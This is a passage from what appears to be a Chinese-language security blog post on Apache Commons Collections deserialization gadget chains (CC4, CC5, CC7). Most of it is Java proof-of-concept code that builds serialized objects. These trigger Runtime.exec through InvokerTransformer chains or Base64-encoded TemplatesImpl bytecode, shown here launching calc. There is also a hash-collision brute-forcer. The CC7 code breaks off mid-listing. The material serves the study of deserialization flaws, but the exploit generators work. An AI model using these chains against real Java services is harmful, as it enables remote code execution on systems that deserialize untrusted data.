class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Comparator;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC4</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">byte</span>[] code = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADMANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABxMc2VyL2V2YWxDbGFzc1RlbXBsYXRlc0ltcGw7AQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACDxjbGluaXQ+AQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEADVN0YWNrTWFwVGFibGUHACkBAApTb3VyY2VGaWxlAQAbZXZhbENsYXNzVGVtcGxhdGVzSW1wbC5qYXZhDAAJAAoHAC4MAC8AMAEABGNhbGMMADEAMgEAE2phdmEvbGFuZy9FeGNlcHRpb24MADMACgEAGnNlci9ldmFsQ2xhc3NUZW1wbGF0ZXNJbXBsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA9wcmludFN0YWNrVHJhY2UAIQAHAAgAAAAAAAQAAQAJAAoAAQALAAAALwABAAEAAAAFKrcAAbEAAAACAAwAAAAGAAEAAAAJAA0AAAAMAAEAAAAFAA4ADwAAAAEAEAARAAIACwAAAD8AAAADAAAAAbEAAAACAAwAAAAGAAEAAAAVAA0AAAAgAAMAAAABAA4ADwAAAAAAAQASABMAAQAAAAEAFAAVAAIAFgAAAAQAAQAXAAEAEAAYAAIACwAAAEkAAAAEAAAAAbEAAAACAAwAAAAGAAEAAAAaAA0AAAAqAAQAAAABAA4ADwAAAAAAAQASABMAAQAAAAEAGQAaAAIAAAABABsAHAADABYAAAAEAAEAFwAIAB0ACgABAAsAAABhAAIAAQAAABK4AAISA7YABFenAAhLKrYABrEAAQAAAAkADAAFAAMADAAAABYABQAAAAwACQAPAAwADQANAA4AEQAQAA0AAAAMAAEADQAEAB4AHwAAACAAAAAHAAJMBwAhBAABACIAAAACACM=&quot;</span>);<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templatesImpl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(templatesImpl, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;code&#125;);<br>        setFieldValue(templatesImpl, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<br>        setFieldValue(templatesImpl, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; Templates.class &#125;,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; templatesImpl &#125; ),<br>        &#125;;<br>        <span class="hljs-comment">//包装innerMap，回调TransformedMap.decorate</span><br>        <span class="hljs-comment">//防止payload生成过程中触发，先放进去一个空的Transform</span><br>        Transformer[] fakeTransformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>)&#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(fakeTransformers);<br><br>        <span class="hljs-type">Comparator</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(transformerChain);<br>        <span class="hljs-comment">//第一个参数是初始化时的大小，至少需要2个元素才会触发排序和比较</span><br>        <span class="hljs-comment">//第二个参数是比较时的Comparator，传入前面实例化的comparator</span><br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">queue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">2</span>, comparator);<br>        queue.add(<span class="hljs-number">1</span>);<br>        queue.add(<span class="hljs-number">2</span>);<br>        setFieldValue(transformerChain, <span class="hljs-string">&quot;iTransformers&quot;</span>, transformers);<br>        <span class="hljs-comment">//生成序列化数据</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        oos.writeObject(queue);<br>        oos.close();<br><br>        <span class="hljs-comment">//System.out.println(barr);</span><br>        <span class="hljs-comment">//反序列化</span><br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray());<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(in);<br>        ois.readObject();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/07/28/Commons-Collections/image-20240728230441860.png" alt="image-20240728230441860"></p><p>不过这条利用链在<code>commons-collections3</code>是无法中利用的。</p><p>因为<code>org.apache.commons.collections4.comparators.TransformingComparator</code>在<code>commons-collections4.0</code>之前没有实现<code>Serializable</code>接口，无法序列化。</p><h2 id="CC5"><a href="#CC5" class="headerlink" title="CC5"></a>CC5</h2><p>这个链主要是为了解决高版本利用问题，使用<code>BadAttributeValueExpException</code>替换<code>AnnotationInvocationHandler</code>配合<code>TiedMapEntry#toString()</code>去串联<code>LazyMap#get()</code>调用<code>transform()</code>触发<code>ChainedTransformer</code>恶意对象反射链。</p><p>也就是我们前面CC1谈到的：</p><p>在8u71以后Java官方修改了<code>sun.reflect.annotation.AnnotationInvocationHandler</code>的<code>readObject</code>函数：<a href="http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/f8a528d0379d">http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/f8a528d0379d</a></p><p>改动后，不再直接使用反序列化得到的Map对象，而是新建了一个<code>LinkedHashMap</code>对象，并将原来的键值添加进去，传进去的恶意Map不再执行set或put操作，便无法触发<code>transform</code>。</p><h3 id="POC-5"><a href="#POC-5" class="headerlink" title="POC"></a>POC</h3><p>先给出Gadget Chains：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java">ObjectInputStream#readObject()<br>    BadAttributeValueExpException#readObject()<br>    TiedMapEntry#toString()<br>    LazyMap#get()<br>                       <span class="hljs-comment">//恶意对象反射链部分</span><br>    ChainedTransformer.transform()<br>                            ConstantTransformer#transform()<br>                            InvokerTransformer#transform()<br>                            Method#invoke()<br>                            Class#getMethod()<br>                            InvokerTransformer#transform()<br>                            Method#invoke()<br>                            Runtime#getRuntime()<br>                            InvokerTransformer#transform()<br>                            Method#invoke()<br>                            Runtime#exec()<br></code></pre></td></tr></table></figure><p>借用学长的改改，同时把serialize和deserialize写进函数里，算是换一种代码风格：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.*;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC5</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        ChainedTransformer chain=getChainedTransformer();<br>        Map lazymap=LazyMap.decorate(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>(),chain);<br>        TiedMapEntry tiedMapEntry=<span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazymap,<span class="hljs-number">1</span>);<br>        BadAttributeValueExpException e=<span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        setFieldValue(e,<span class="hljs-string">&quot;val&quot;</span>,tiedMapEntry);<br>        deserialize(serialize(e));<br>    &#125;<br>    <span class="hljs-keyword">static</span> ChainedTransformer <span class="hljs-title function_">getChainedTransformer</span><span class="hljs-params">()</span>&#123;<br>        ConstantTransformer ct=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class);<br><br>        InvokerTransformer it1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                <span class="hljs-string">&quot;getMethod&quot;</span>,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;<br>        );<br>        InvokerTransformer it2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                <span class="hljs-string">&quot;invoke&quot;</span>,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;<br>        );<br>        InvokerTransformer it_exec=<span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                <span class="hljs-string">&quot;exec&quot;</span>,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;<br>        );<br>        Transformer[] a=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;ct,it1,it2,it_exec&#125;;<br>        ChainedTransformer chain=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(a);<br>        <span class="hljs-keyword">return</span> chain;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object newValue)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> obj.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, newValue);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] serialize(Object obj) <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(obj);<br>        oos.close();<br>        <span class="hljs-keyword">return</span> baos.toByteArray();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deserialize</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes)).readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/07/28/Commons-Collections/image-20240728231404160.png" alt="image-20240728231404160"></p><h2 id="CC7"><a href="#CC7" class="headerlink" title="CC7"></a>CC7</h2><p>CC7压轴。</p><p>因为它真的很绕。打的还是<code>CommonsCollections 3.1 - 3.2.1</code></p><p>换了<code>Hashtable</code>类，利用其<code>reconstitutionPut</code>方法中比较key的值，会调用LazyMap的equals方法。</p><h3 id="为什么要put两个lazymap"><a href="#为什么要put两个lazymap" class="headerlink" title="为什么要put两个lazymap"></a>为什么要put两个lazymap</h3><p>因为为了进<code>reconstitutionPut</code> <code>for</code>循环，<code>tab</code>需要不为空。</p><p><code>tab</code>其实就是<code>hashtable</code>，<code>entry</code>是单链，动调能发现<code>put</code>两个的时候能让<code>tab</code>不为空</p><img src="/2024/07/28/Commons-Collections/image-20240728232740736.png" class="" title="image-20240728232740736"><h3 id="哈希碰撞"><a href="#哈希碰撞" class="headerlink" title="哈希碰撞"></a>哈希碰撞</h3><p><code>if</code>这一行由于用 <code>&amp;&amp;</code> 连接，左边为<code>false</code>就不会执行右边。</p><p>这两个<code>hash</code>对应当前<code>key</code>和上一个<code>key</code>的<code>hashcode</code>：</p><img src="/2024/07/28/Commons-Collections/image-20240728233018118.png" class="" title="image-20240728233018118"><p>这里key我们选择的是String，观察<code>String.hashCode()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> hash;<br>    <span class="hljs-keyword">if</span> (h == <span class="hljs-number">0</span> &amp;&amp; value.length &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-type">char</span> val[] = value;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; value.length; i++) &#123;<br>            h = <span class="hljs-number">31</span> * h + val[i];<br>        &#125;<br>        hash = h;<br>    &#125;<br>    <span class="hljs-keyword">return</span> h;<br>&#125;<br></code></pre></td></tr></table></figure><p>爆破两位就可:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HashCollision</span> &#123;<br>    <span class="hljs-keyword">static</span> String dict=<span class="hljs-string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\&quot;#$%&amp;\&#x27;()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~ \t\n\r&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">int</span> len=dict.length();<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> a1=<span class="hljs-number">0</span>;a1&lt;len;a1++)&#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> a2=<span class="hljs-number">0</span>;a2&lt;len;a2++)&#123;<br>                <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> b1=<span class="hljs-number">0</span>;b1&lt;len;b1++)&#123;<br>                    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> b2=<span class="hljs-number">0</span>;b2&lt;len;b2++)&#123;<br>                        <span class="hljs-keyword">if</span>(a1!=b1&amp;&amp;a2!=b2)&#123;<br>                            String s1=get(a1)+get(a2);<br>                            String s2=get(b1)+get(b2);<br>                            <span class="hljs-keyword">if</span>(s1.hashCode()==s2.hashCode())&#123;<br>                                System.out.println(s1+<span class="hljs-string">&quot;\n&quot;</span>+s2);<br>                                <span class="hljs-keyword">return</span>;<br>                            &#125;<br>                        &#125;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;fuck&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">static</span> String <span class="hljs-title function_">get</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>&#123;<br>        <span class="hljs-keyword">return</span>  String.valueOf(dict.charAt(i));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="为什么map2-remove-00"><a href="#为什么map2-remove-00" class="headerlink" title="为什么map2.remove(&quot;00&quot;);"></a>为什么<code>map2.remove(&quot;00&quot;);</code></h3><p>其实和上面的CommonsCollections6一样道理，<code>hashtable.put(map2, 1);</code>这一行也会调用<code>lazymap.get</code>，从而多加了一个带着<code>processImpl</code>的元素，不能序列化。</p><p><img src="/2024/07/28/Commons-Collections/image-20240728233236250.png" alt="image-20240728233236250"></p><h3 id="POC-6"><a href="#POC-6" class="headerlink" title="POC"></a>POC</h3><p>先给出Gadget Chains：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java">Hashtable#readObject()<br>    Hashtable#reconstitutionPut()<br>AbstractMapDecorator#equals()<br>    AbstractMap#equals()<br>    LazyMap#get()<br>                                <span class="hljs-comment">//恶意对象反射链部分</span><br>    ChainedTransformer#transform()<br>                            ConstantTransformer#transform()<br>                            InvokerTransformer#transform()<br>                            Method#invoke()<br>                            Class#getMethod()<br>                            InvokerTransformer#transform()<br>                            Method#invoke()<br>                            Runtime#getRuntime()<br>                            InvokerTransformer#transform()<br>                            Method#invoke()<br>                            Runtime#exec()<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC7</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chain</span> <span class="hljs-operator">=</span> getChainedTransformer();<br><br>            Map&lt;String, Integer&gt; hashMap1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>            Map&lt;String, Integer&gt; hashMap2 = <span class="hljs-keyword">new</span> <span class="hljs-title 